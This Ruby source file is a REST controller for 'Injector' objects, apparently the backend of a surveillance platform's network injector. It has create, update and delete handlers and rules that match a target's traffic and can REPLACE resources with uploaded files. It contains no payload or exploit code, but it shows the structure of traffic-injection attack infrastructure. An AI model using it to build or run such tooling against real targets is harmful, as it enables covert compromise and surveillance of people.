#
# Controller for the Injector objects
#

require_relative '../frontend'

module RCS
module DB

class InjectorController < RESTController

  def index
    require_auth_level :server, :sys, :tech

    mongoid_query do
      result = ::Injector.all

      return ok(result)
    end
  end

  def show
    require_auth_level :server, :sys, :tech

    mongoid_query do
      injector = ::Injector.find(@params['_id'])
      return ok(injector)
    end
  end

  def create
    require_auth_level :sys

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :injectors

    result = Injector.create(name: @params['name'],
                             adddress: @params['address'],
                             port: 443,
                             poll: false,
                             configured: false,
                             redirect: 'auto',
                             redirection_tag: 'ww')

    Audit.log :actor => @session[:user][:name], :action => 'injector.create', :desc => "Created the injector '#{@params['name']}'"

    return ok(result)
  end

  def update
    require_auth_level :sys

    mongoid_query do
      injector = Injector.find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if injector[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name], :action => 'injector.update', :desc => "Updated '#{key}' to '#{value}' for injector '#{injector['name']}'"
        end
      end

      injector.update_attributes(@params)

      return ok(injector)
    end
  end

  def destroy
    require_auth_level :sys

    mongoid_query do
      injector = Injector.find(@params['_id'])
      injector_name = injector.name
      # make sure to destroy all the rules
      injector.rules.destroy_all
      injector.destroy
      Audit.log :actor => @session[:user][:name], :action => 'injector.destroy', :desc => "Deleted the injector '#{injector_name}'"
      
      return ok
    end
  end

  def version
    require_auth_level :server

    mongoid_query do
      injector = Injector.find(@params['_id'])
      @params.delete('_id')

      injector.version = @params['version']
      injector.save

      return ok
    end
  end

  def config
    require_auth_level :server, :sys
    
    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      return not_found if injector[:_grid].empty? or injector[:_grid].first.nil?

      # reset the flag for the "configuration needed"
      injector.configured = true
      injector.save

      return stream_grid(injector[:_grid].first)
    end
  end

  def logs
    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      case @request[:method]
        when 'GET'
          require_auth_level :sys, :tech
          
          klass = CappedLog.collection_class injector[:_id]
          logs = klass.all
          return ok(logs)

        when 'POST'
          require_auth_level :server

          entry = CappedLog.dynamic_new injector[:_id]
          entry.time = Time.parse(@params['time']).getutc.to_i
          entry.type = @params['type'].downcase
          entry.desc = @params['desc']
          entry.save
          return ok
      end

      return bad_request
    end
  end

  def del_logs
    require_auth_level :sys, :tech

    mongoid_query do
      injector = Injector.find(@params['_id'])

      # we cannot call delete_all on a capped collection
      # we must drop it:
      # http://www.mongodb.org/display/DOCS/Capped+Collections#CappedCollections-UsageandRestrictions
      db = Mongoid.database
      logs = db.collection(CappedLog.collection_name(injector[:_id]))
      logs.drop

      return ok
    end
  end

  # rule creation and modification
  def add_rule
    require_auth_level :tech

    mongoid_query do
      injector = ::Injector.find(@params['_id'])

      rule = ::InjectorRule.new
      rule.enabled = @params['rule']['enabled']
      rule.probability = @params['rule']['probability']
      rule.disable_sync = @params['rule']['disable_sync']
      rule.ident = @params['rule']['ident']
      rule.ident_param = @params['rule']['ident_param']
      rule.resource = @params['rule']['resource']
      rule.action = @params['rule']['action']
      rule.action_param = @params['rule']['action_param']
      rule.action_param_name = @params['rule']['action_param_name']

      target = ::Item.find(@params['rule']['target_id'].first)
      return not_found("Target not found") if target.nil?

      rule.target_id = [ target[:_id] ]

      # the file is uploaded to the grid before calling this method
      if rule.action == 'REPLACE' and not @params['rule']['action_param'].nil?
        path = Config.instance.temp(@params['rule']['action_param'])
        if File.exist?(path) and File.file?(path)
          rule[:_grid] = [GridFS.put(File.open(path, 'rb+') {|f| f.read}, {filename: @params['rule']['action_param']})]
          File.unlink(path)
        end
      end
      
      Audit.log :actor => @session[:user][:name], :action => 'injector.add_rule',
                :desc => "Added a rule to the injector '#{injector.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      injector.rules << rule
      injector.save

      return ok(rule)
    end
  end

  def del_rule
    require_auth_level :tech

    mongoid_query do
      injector = ::Injector.find(@params['_id'])
      rule = injector.rules.find(@params['rule']['_id'])
      target = ::Item.find(rule.target_id.first)

      Audit.log :actor => @session[:user][:name], :action => 'injector.del_rule', :target_name => target.name,
                :desc => "Deleted a rule from the injector '#{injector.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      injector.rules.delete_all(conditions: { _id: rule[:_id]})
      injector.save

      return ok
    end
  end

  def update_rule
    require_auth_level :tech, :sys

    mongoid_query do

      injector = ::Injector.find(@params['_id'])
      rule = injector.rules.find(@params['rule']['_id'])

      @params.delete('_id')
      unless @params['rule']['target_id'].nil?
        target = ::Item.find(@params['rule']['target_id'].first)
        @params['rule']['target_id'] = [ target[:_id] ]
      end

      rule.update_attributes(@params['rule'])

      # remove any grid pointer if we are changing the type of action
      if rule.action != 'REPLACE'
        GridFS.delete rule[:_grid].first unless rule[:_grid].nil?
        rule[:_grid] = nil
      end
      
      # the file is uploaded to the grid before calling this method
      if rule.action == 'REPLACE' and not @params['rule']['action_param'].nil?
        path = Config.instance.temp(@params['rule']['action_param'])
        if File.exist?(path) and File.file?(path)
          # delete any previous file in the grid
          GridFS.delete rule[:_grid].first unless rule[:_grid].nil?
          rule[:_grid] = [GridFS.put(File.open(path, 'rb+') {|f| f.read}, {filename: @params['rule']['action_param']})]
          File.unlink(path)
        end
      end

      rule.save
      
      Audit.log :actor => @session[:user][:name], :action => 'injector.update_rule',
                :desc => "Modified a rule on the injector '#{injector.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      return ok(rule)
    end
  end

end

end #DB::
end #RCS::
